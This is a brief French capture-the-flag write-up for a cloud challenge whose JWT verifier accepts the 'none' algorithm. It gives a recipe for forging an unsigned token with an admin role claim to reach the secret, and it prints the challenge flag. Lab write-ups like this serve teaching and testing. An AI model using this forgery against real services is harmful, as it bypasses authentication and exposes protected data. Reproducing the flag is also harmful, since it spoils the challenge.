# backup-oidc (cloud, id 21) — JWT alg=none

## Challenge
**Catégorie :** cloud  **Instance :** par équipe, HTTP  **Résolu par :** ctf-finale-bc (session coordonnée)

## Résolution (résumé)
Authentification OIDC/JWT dont le vérificateur accepte l'algorithme **`none`** (ou ne vérifie
pas la signature). On forge un JWT avec `{"alg":"none"}` et un payload privilégié (rôle/claim
admin), signature vide → le serveur l'accepte → accès au secret.

```
header  = {"alg":"none","typ":"JWT"}
payload = {..., "role":"admin" / claim attendu}
token   = base64url(header) + "." + base64url(payload) + "."   (signature vide)
-> Authorization: Bearer <token> -> flag
```

## Flag
`NCTF{dea010e84499df6e317ad60a}`
